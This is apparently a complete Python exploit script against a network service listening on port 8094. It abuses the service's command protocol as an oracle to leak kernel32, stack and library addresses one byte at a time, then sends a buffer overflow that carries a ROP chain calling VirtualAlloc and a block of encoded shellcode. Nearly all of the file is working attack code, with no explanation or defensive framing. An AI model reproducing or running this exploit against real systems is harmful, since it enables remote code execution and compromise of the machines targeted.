#!/usr/bin/python

import socket
from os import sys
from struct import pack

badchars = [0x00, 0x0D, 0x02, 0x0A]


def main():
    if len(sys.argv) != 2:
        print("Usage: %s <ip_address>\n" % (sys.argv[0]))
        sys.exit(1)
    exploit()


def gen_payload(kernel32_base_addr, stack_address, libpal_base_addr):
    size = 0x404
    eip = pack("<L", libpal_base_addr + 0x44c5a) # add esp, 0x00000660 ; retn 0x0010
    eip_offset = 0x80

    rop_offset = 0x58
    rop = gen_rop(kernel32_base_addr)
    
    valloc_stub = gen_valloc_stub(kernel32_base_addr, stack_address)

    buf = b"\x90"  # for condition
    buf += b"\x42" * (rop_offset - len(buf)) + rop
    buf += b"\x41" * (eip_offset - len(buf)) + eip
    buf += valloc_stub +shellcode()
    buf += b"\x43" * (size - len(buf))
    return buf


def exploit():
    print("[!] Leaking Kernel32 Base Address...")
    kernel32_base_addr = leak_kernel32()
    # kernel32_base_addr = 0x75b20000
    print(f"[+] Kernel32 Base Address:{hex(kernel32_base_addr)}")

    print("[!] Leaking Stack Address...")
    stack_addr = leak_stack_address()
    print(f"[+] Stack Address:{hex(stack_addr)}")

    print("[!] Leaking libpal Address...")
    libpal_addr = leak_libpal_address()
    print(f"[+] libpal Address:{hex(libpal_addr)}")

    print("[!] Generating Exploit...")
    cmd = create_cmd_payload(False, 1, 0x400, 0xFFFFFF90)

    s = create_connection()
    s.send(cmd)
    payload = gen_payload(kernel32_base_addr, stack_addr, libpal_addr)

    print("[!] Sending Exploit...")
    s.send(payload)
    print("[+] Done")


def gen_valloc_stub(kernel32_base_addr, stack_address):
    payload_base = stack_address - 0x550
    sc_addr = payload_base + 0x24
    virtualAllocStub = pack("<L", 0xcccccccc) * 3 #fill
    virtualAllocStub +=  pack("<L", kernel32_base_addr + 0x16380) #VirtualAlloc address
    virtualAllocStub +=  pack("<L", sc_addr) #return (shellcode) address
    virtualAllocStub +=  pack("<L", sc_addr) #lpAddress
    virtualAllocStub +=  pack("<L", 0x00000001) #dwSize
    virtualAllocStub +=  pack("<L", 0x00001000) #flAllocationType
    virtualAllocStub +=  pack("<L", 0x00000040) #flProtect8
    return virtualAllocStub

def gen_rop(kernel32_base_addr):
    rop = b""
    rop+= pack("<L", kernel32_base_addr + 0x232b6)  # add esp, 0x18 ; pop edi ; pop esi ; pop ebx ; ret
    return rop

def leak_kernel32():
    return leak_memory(2, 0x574) - 0x00010000


def leak_stack_address():
    return leak_memory(4, 0x580)

def leak_libpal_address():
    return leak_memory(4, 0x570) - 0x40a30


def leak_memory(nbytes, offset):
    val = 0
    for pos in range(0, nbytes):
        for i in range(0, 0xFF + 1):
            check = 0xFF - i
            to_check = check
            if (check & 0x80) != 0:
                to_check = to_check + 0xFFFFFF00
            if check_byte(offset - pos, to_check):
                val = val + (check << (3 - pos) * 8)
                break
    return val


def check_byte(position, value):
    s = create_connection()
    buf = create_cmd_payload(True, position, 1, value)
    s.send(buf)
    s.send(b"\x90")
    r = s.recv(1024)
    # print(r)
    s.close()
    return len(r) > 16


def create_cmd_payload(do_decrpyt, offset, size, compare):
    decrypt = 0
    if do_decrpyt:
        decrypt = 0x00020000
    buf = pack("<L", 0xABBA1975)
    buf += pack("<L", 0x42424242)
    buf += pack("<L", decrypt)
    buf += pack("<L", offset)
    buf += pack("<L", size)
    buf += pack("<L", compare)
    return buf


def create_connection():
    server = sys.argv[1]
    port = 8094
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    return s


def shellcode():
    buf =  b"\x90"*0x0c
    buf += b"\xbd\x0e\x27\xdd\x5d\xda\xc6\xd9\x74\x24\xf4\x58"
    buf += b"\x2b\xc9\xb1\x52\x31\x68\x12\x03\x68\x12\x83\xce"
    buf += b"\x23\x3f\xa8\x32\xc3\x3d\x53\xca\x14\x22\xdd\x2f"
    buf += b"\x25\x62\xb9\x24\x16\x52\xc9\x68\x9b\x19\x9f\x98"
    buf += b"\x28\x6f\x08\xaf\x99\xda\x6e\x9e\x1a\x76\x52\x81"
    buf += b"\x98\x85\x87\x61\xa0\x45\xda\x60\xe5\xb8\x17\x30"
    buf += b"\xbe\xb7\x8a\xa4\xcb\x82\x16\x4f\x87\x03\x1f\xac"
    buf += b"\x50\x25\x0e\x63\xea\x7c\x90\x82\x3f\xf5\x99\x9c"
    buf += b"\x5c\x30\x53\x17\x96\xce\x62\xf1\xe6\x2f\xc8\x3c"
    buf += b"\xc7\xdd\x10\x79\xe0\x3d\x67\x73\x12\xc3\x70\x40"
    buf += b"\x68\x1f\xf4\x52\xca\xd4\xae\xbe\xea\x39\x28\x35"
    buf += b"\xe0\xf6\x3e\x11\xe5\x09\x92\x2a\x11\x81\x15\xfc"
    buf += b"\x93\xd1\x31\xd8\xf8\x82\x58\x79\xa5\x65\x64\x99"
    buf += b"\x06\xd9\xc0\xd2\xab\x0e\x79\xb9\xa3\xe3\xb0\x41"
    buf += b"\x34\x6c\xc2\x32\x06\x33\x78\xdc\x2a\xbc\xa6\x1b"
    buf += b"\x4c\x97\x1f\xb3\xb3\x18\x60\x9a\x77\x4c\x30\xb4"
    buf += b"\x5e\xed\xdb\x44\x5e\x38\x4b\x14\xf0\x93\x2c\xc4"
    buf += b"\xb0\x43\xc5\x0e\x3f\xbb\xf5\x31\x95\xd4\x9c\xc8"
    buf += b"\x7e\x1b\xc8\xd2\x12\xf3\x0b\xd2\xeb\xb8\x85\x34"
    buf += b"\x81\xae\xc3\xef\x3e\x56\x4e\x7b\xde\x97\x44\x06"
    buf += b"\xe0\x1c\x6b\xf7\xaf\xd4\x06\xeb\x58\x15\x5d\x51"
    buf += b"\xce\x2a\x4b\xfd\x8c\xb9\x10\xfd\xdb\xa1\x8e\xaa"
    buf += b"\x8c\x14\xc7\x3e\x21\x0e\x71\x5c\xb8\xd6\xba\xe4"
    buf += b"\x67\x2b\x44\xe5\xea\x17\x62\xf5\x32\x97\x2e\xa1"
    buf += b"\xea\xce\xf8\x1f\x4d\xb9\x4a\xc9\x07\x16\x05\x9d"
    buf += b"\xde\x54\x96\xdb\xde\xb0\x60\x03\x6e\x6d\x35\x3c"
    buf += b"\x5f\xf9\xb1\x45\xbd\x99\x3e\x9c\x05\xb9\xdc\x34"
    buf += b"\x70\x52\x79\xdd\x39\x3f\x7a\x08\x7d\x46\xf9\xb8"
    buf += b"\xfe\xbd\xe1\xc9\xfb\xfa\xa5\x22\x76\x92\x43\x44"
    buf += b"\x25\x93\x41"
    return buf


if __name__ == "__main__":
    main()
